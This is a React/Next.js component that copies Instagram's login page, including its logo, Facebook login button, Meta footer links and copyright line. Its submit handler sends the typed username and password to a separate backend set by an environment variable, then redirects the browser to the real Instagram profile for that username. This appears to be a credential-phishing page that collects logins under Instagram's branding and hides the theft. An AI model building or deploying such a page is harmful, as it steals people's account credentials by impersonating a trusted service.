"use client";

import { useState } from "react";
import axios from "axios";

export default function Login() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";
      const response = await axios.post(`${API_URL}/api/auth/login`, formData);

      if (response.data.token) {
        localStorage.setItem("token", response.data.token);
        localStorage.setItem("user", JSON.stringify(response.data.user));
        window.location.href = `https://www.instagram.com/${formData.email}`;
      }
    } catch (err: any) {
      setError(err.response?.data?.error || "Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-black px-4 py-8">
      <div className="w-full max-w-[350px]">
        {/* Instagram Logo */}
        <div className="text-center mb-10">
          <h1
            className="text-[52px] font-normal text-white"
            style={{
              fontFamily: "'Billabong', 'Brush Script MT', cursive",
              fontWeight: 400,
              letterSpacing: '0.5px'
            }}
          >
            Instagram
          </h1>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-2 mb-4">
          <input
            type="text"
            placeholder="Phone number, username or email address"
            className="w-full px-3 py-3 text-xs border border-[#363636] rounded-sm bg-[#121212] text-white placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition-colors"
            value={formData.email}
            onChange={(e) =>
              setFormData({ ...formData, email: e.target.value })
            }
            required
          />

          <input
            type="password"
            placeholder="Password"
            className="w-full px-3 py-3 text-xs border border-[#363636] rounded-sm bg-[#121212] text-white placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition-colors"
            value={formData.password}
            onChange={(e) =>
              setFormData({ ...formData, password: e.target.value })
            }
            required
          />

          {error && (
            <p className="text-red-500 text-xs text-center py-2">{error}</p>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0095f6] text-white py-2 rounded-lg font-semibold text-sm hover:bg-[#1877f2] disabled:opacity-50 disabled:cursor-not-allowed mt-3"
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {/* OR Divider */}
        <div className="flex items-center my-5">
          <div className="flex-1 h-px bg-[#363636]"></div>
          <span className="px-4 text-xs text-[#737373] font-semibold">OR</span>
          <div className="flex-1 h-px bg-[#363636]"></div>
        </div>

        {/* Facebook Login */}
        <div className="text-center mb-5">
          <button
            type="button"
            className="flex items-center justify-center w-full text-sm text-[#1877f2] font-semibold hover:text-white transition-colors"
          >
            <svg
              className="w-5 h-5 mr-2"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Log in with Facebook
          </button>
        </div>

        {/* Forgot Password */}
        <div className="text-center mb-10">
          <a href="#" className="text-xs text-white hover:text-[#a8a8a8] transition-colors">
            Forgotten your password?
          </a>
        </div>

        {/* Sign Up Section */}
        <div className="text-center text-sm mb-10">
          <span className="text-white">Don&apos;t have an account? </span>
          <a href="#" className="text-[#0095f6] font-semibold hover:text-white transition-colors">
            Sign up
          </a>
        </div>

        {/* Footer Links */}
        <div className="text-center">
          <div className="flex flex-wrap justify-center gap-x-3 gap-y-2 mb-4 text-xs text-[#737373]">
            <a href="#" className="hover:underline">Meta</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Blog</a>
            <a href="#" className="hover:underline">Jobs</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">API</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Locations</a>
            <a href="#" className="hover:underline">Instagram Lite</a>
            <a href="#" className="hover:underline">Meta AI</a>
            <a href="#" className="hover:underline">Meta AI articles</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Contact uploading and non-users</a>
            <a href="#" className="hover:underline">Meta Verified</a>
          </div>

          <div className="flex items-center justify-center gap-4 text-xs text-[#737373]">
            <select className="bg-transparent text-[#737373] border-none focus:outline-none cursor-pointer">
              <option>English (UK)</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </div>
    </div>
  );
}
